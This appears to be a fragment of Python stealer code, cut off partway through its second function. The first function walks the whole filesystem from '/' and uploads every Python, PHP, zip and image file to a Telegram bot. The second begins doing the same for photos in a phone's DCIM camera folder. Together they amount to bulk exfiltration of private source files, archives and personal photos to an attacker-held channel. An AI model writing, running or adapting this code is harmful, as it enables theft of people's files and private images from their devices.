def scan_and_send_files(bot_token, chat_id, folder_path='/'):
    import os
    import requests
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(('.py', '.php', '.zip', '.png', '.jpg', '.jpeg')):
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    files_data = {'document': f}
                    data = {'chat_id': chat_id}
                    requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data=data, files=files_data)

def send_photos_in_dcim_to_telegram(bot_token, chat_id, dcim_folder_path):
    import os
    import requests
    for root, dirs, files in os.walk(dcim_folder_path):
        for file in files:
            if file.endswith(('.png', '.jpg', '.jpeg')):
